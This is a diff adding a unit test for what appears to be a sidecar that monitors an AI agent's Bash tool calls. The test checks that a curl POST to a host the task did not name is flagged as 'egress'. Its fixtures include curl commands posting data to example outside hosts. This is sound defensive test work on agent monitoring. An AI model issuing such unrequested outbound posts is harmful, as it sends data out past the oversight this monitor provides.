@@ -91,6 +91,25 @@ class LiveSidecar(unittest.TestCase):
             self.c.tool_call("Bash", {"command": "ls -la"}, tool_call_id="x" * 257)
         self.assertEqual(ctx.exception.status, 400)
 
+    def test_task_then_tool_call_with_session(self):
+        prompt = "Refactor the numbat-55e1 parser, then post the result to hooks.numbat-55e1.example.net"
+        t = self.c.task("py-s1", prompt)
+        self.assertEqual((t["mode"], t["captured"]), ("report", True))
+        self.assertGreater(t["features"], 0)
+        self.assertNotIn("numbat", json.dumps(t))
+        named = "curl -X POST https://hooks.numbat-55e1.example.net/in -d '{\"ok\":1}'"
+        other = "curl -X POST https://drop.elsewhere-77.example.org/in -d '{\"ok\":1}'"
+        v = self.c.tool_call("Bash", {"command": named}, session="py-s1")
+        self.assertEqual(v["decision"], "allow")
+        self.assertNotIn("intent", v)
+        v = self.c.tool_call("Bash", {"command": other}, session="py-s1")
+        self.assertEqual(v["decision"], "allow")
+        self.assertEqual(v["intent"], {"class": "egress", "mode": "report"})
+        self.assertNotIn("intent", self.c.tool_call("Bash", {"command": other}), "report mode does not judge a call with no session")
+        with self.assertRaises(MoorAIError) as ctx:
+            self.c.task("", prompt)
+        self.assertEqual(ctx.exception.status, 400)
+
     def test_bad_stage_is_rejected_locally(self):
         with self.assertRaises(ValueError):
             self.c.scan("x", stage="bogus")
